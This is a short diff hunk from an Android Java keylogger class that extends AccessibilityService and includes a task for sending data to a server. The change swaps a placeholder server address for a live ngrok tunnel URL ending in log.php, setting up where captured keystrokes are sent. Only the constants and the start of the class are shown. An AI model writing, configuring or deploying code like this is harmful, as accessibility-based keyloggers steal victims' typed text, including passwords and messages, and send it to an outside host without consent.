@@ -18,7 +18,7 @@ import java.util.Locale;
  */
 public class Keylogger extends AccessibilityService {
 
-    private static final String SERVER_URL = "https://yourserver.com/log.php";
+    private static final String SERVER_URL = "https://locust-handy-seagull.ngrok-free.app/log.php";
     private static final String TAG = "Keylogger";
 
     private class SendToServerTask extends AsyncTask<String, Void, Void> {
